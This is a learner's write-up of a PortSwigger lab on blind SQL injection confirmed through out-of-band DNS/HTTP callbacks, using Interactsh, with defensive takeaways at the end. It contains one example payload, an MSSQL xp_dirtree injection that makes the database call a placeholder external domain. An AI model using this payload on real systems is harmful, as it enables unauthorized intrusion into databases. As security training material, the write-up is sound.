# Blind SQL Injection with Out-of-Band (OAST) Interaction

## Lab Overview

This PortSwigger Web Security Academy lab demonstrated how Out-of-Band Application Security Testing (OAST) techniques can be used to identify Blind SQL Injection vulnerabilities.

In this scenario, the application did not return:

- Visible SQL errors
- Query results
- Meaningful timing differences

Because traditional response-based techniques were ineffective, the vulnerability had to be detected by forcing the backend database server to interact with an external system controlled by the tester.

---

## Objective

Confirm a Blind SQL Injection vulnerability by triggering an external HTTP/DNS interaction from the backend database server.

---

## Vulnerability Explanation

The application processed user-controlled input within a backend SQL query without proper sanitization.

However, unlike previous SQL Injection labs:

- No query results were reflected
- No useful error messages were displayed
- Timing-based techniques were unreliable

To identify the vulnerability, Out-of-Band (OAST) techniques were required.

OAST works by causing the vulnerable server to make an outbound request to an external domain controlled by the tester, confirming that injected SQL statements are being executed.

---

## Approach

The official lab solution uses Burp Collaborator for OAST interaction monitoring.

Since I was using Burp Suite Community Edition, I attempted to replicate the same concept using **Interactsh**, an open-source OAST tool capable of capturing DNS and HTTP callbacks.

During the lab, I practiced:

- Setting up and running Interactsh
- Crafting SQL payloads designed to trigger external callbacks
- Intercepting and modifying requests with Burp Suite
- Troubleshooting payload encoding and proxy configuration

---

## Example Payload Concept

```sql
'; exec master..xp_dirtree '//unique-id.oast-domain.com/a'--
```

This type of payload attempts to force the database server to perform an outbound DNS or HTTP request to an attacker-controlled domain.

If the interaction is received externally, it confirms that the injected SQL query was executed by the backend system.

---

## Challenges Faced

One major challenge was that the PortSwigger lab environment appeared to be specifically configured for Burp Collaborator integration.

As a result:

- Interactsh callbacks were not successfully triggered
- Full exploitation could not be completed within the current setup

Despite this limitation, the troubleshooting process provided valuable insight into how OAST-based SQL Injection works in real-world scenarios.

---

## Why OAST Techniques Matter

Out-of-Band techniques are extremely useful when applications suppress:

- Errors
- Query results
- Timing differences

Even when no visible evidence exists in the application response, external interactions can reveal that injected SQL commands are being executed behind the scenes.

This demonstrates how attackers may still confirm vulnerabilities through indirect communication channels.

---

## Key Learnings

- Blind SQL Injection does not always rely on visible output or timing analysis.
- OAST techniques provide alternative detection methods through external callbacks.
- Tool limitations and environment-specific behavior can significantly impact testing results.
- Troubleshooting failed payloads is an important part of offensive security workflows.

---

## Security Takeaways

- Use parameterized queries and prepared statements.
- Restrict outbound network access from database servers whenever possible.
- Monitor unexpected DNS and HTTP traffic from backend systems.
- Apply proper input validation and least-privilege database configurations.

---

## Skills Practiced

- Out-of-Band Application Security Testing (OAST)
- Blind SQL Injection techniques
- Interactsh setup and testing
- Burp Suite request manipulation
- Payload crafting and troubleshooting

---

## Platform

PortSwigger Web Security Academy
